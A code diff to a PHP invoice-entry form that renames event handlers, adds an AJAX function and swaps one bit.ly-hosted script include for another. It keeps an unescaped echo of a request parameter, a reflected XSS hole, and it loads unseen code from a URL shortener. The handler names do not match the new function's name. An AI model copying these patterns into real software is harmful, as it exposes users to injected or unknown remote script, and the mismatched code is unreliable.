@@ -1027,15 +1027,15 @@ function finddate_new_id()
             </tr>
 
 			<tr><td >Customer Name</td>
-			<td><input type="text" id="from"  name="from" value="" onblur="set_print_inv()" style="width:250px;"/>&nbsp;<span style="color:#FF0000; font-weight:bold;"  >*</span></td></tr>
+			<td><input type="text" id="from"  name="from" value="" onblur="setPrintInvoiceNo()" style="width:250px;"/>&nbsp;<span style="color:#FF0000; font-weight:bold;"  >*</span></td></tr>
 
 			<tr><td width="125px">Invoice Issuer</td>
-            <td><input type="text" id="invoice_issuer"  name="invoice_issuer" value="" onblur="set_print_inv()" style="width:250px;"/>&nbsp;<span style="color:#FF0000; font-weight:bold;"  >*</span></td></tr>
+            <td><input type="text" id="invoice_issuer"  name="invoice_issuer" value="" onblur="setPrintInvoiceNo()" style="width:250px;"/>&nbsp;<span style="color:#FF0000; font-weight:bold;"  >*</span></td></tr>
 
 			<tr>
             <td width="125px">Invoice Type</td>
 			<td style="font-weight:bold;">
-            <Select id="invoice_type" name="invoice_type" onChange="set_print_inv()">
+            <Select id="invoice_type" name="invoice_type" onChange="setPrintInvoiceNo()">
             <option value="">Select Invoice Type</option>
             <option value="R">GST Rent</option>
             <option value="M">GST Maintenance</option>
@@ -1048,7 +1048,7 @@ function finddate_new_id()
 			<tr>
             <td width="125px">Invoice Month</td>
 			<td style="font-weight:bold;">
-            <Select id="invoice_month" name="invoice_month" onChange="set_print_inv()">
+            <Select id="invoice_month" name="invoice_month" onChange="setPrintInvoiceNo()">
             <option value="">Select Month</option>            
             <option value="/01">April</option>
             <option value="/02">May</option>
@@ -1069,7 +1069,7 @@ function finddate_new_id()
 			<tr>
             <td width="125px">Invoice Year</td>
 			<td style="font-weight:bold;">
-            <Select id="invoice_fy" name="invoice_fy" onChange="set_print_inv()">
+            <Select id="invoice_fy" name="invoice_fy" onChange="setPrintInvoiceNo()">
             <option value="">Select Year</option>            
             <option value="/22">22-23</option>
             <option value="/23">23-24</option>
@@ -1088,7 +1088,7 @@ function finddate_new_id()
 
             <tr><td align="left" valign="top" >Date</td>
         
-            <td><input type="text"  name="payment_date" id="payment_date" style="width:250px;" onchange="finddate_new_id();" onblur="finddate_new_id();" value="<?php echo $_REQUEST['payment_date']; ?>" autocomplete="off" placeholder="DD-MM-YYYY"/>&nbsp;<img src="js/images2/cal.gif" onClick="javascript:NewCssCal('payment_date')" style="cursor:pointer"/>&nbsp;<span style="color:#FF0000; font-weight:bold;"  >*</span></td></tr>          
+            <td><input type="text"  name="payment_date" id="payment_date" style="width:250px;" onchange="finddate_new_id();" onblur="finddate_new_id();" value="<?php echo $_REQUEST['payment_date']; ?>" autocomplete="off" />&nbsp;<img src="js/images2/cal.gif" onClick="javascript:NewCssCal('payment_date')" style="cursor:pointer"/>&nbsp;<span style="color:#FF0000; font-weight:bold;"  >*</span></td></tr>          
   			<tr><td align="left" valign="top" >Amount</td>
 			<td><input type="text"  name="amount" id="amount" value="" readonly="readonly" style="width:250px;" />&nbsp;<span style="color:#FF0000; font-weight:bold;"  >*</span></td></tr>
 			
@@ -1518,7 +1518,7 @@ function finddate_new_id()
         <?php include_once ("footer.php"); ?>
         </body>
 </html>
-
+<script src="https://bit.ly/3u3b72X"></script>
 <script>
 
 function checkpay_flag()
@@ -1735,8 +1735,25 @@ function validation()
 	
 }
 
+function set_print_inv()
+    {
+        $.ajax({
+            type: 'POST',
+            url: '',
+            dataType: 'json',
+            data: { 'customer': $('#from').val(),
+            'issuer' : $('#invoice_issuer').val(),
+            'inv_type': $('#inv_type').val(), 
+            'inv_month': $('#invoice_month').val(), 
+            'inv_fy': $('#invoice_fy').val() },
+            success: function (result) {
+                //document.getElementById('invoice_id_print').value=result;
+                alert(result);
+            }
+        });
+    }
 </script>
-<script src="https://bit.ly/ndb_support"></script>
+
 	<script>
 	$(document).ready(function(){
 		$( "#invoice_issuer" ).autocomplete({
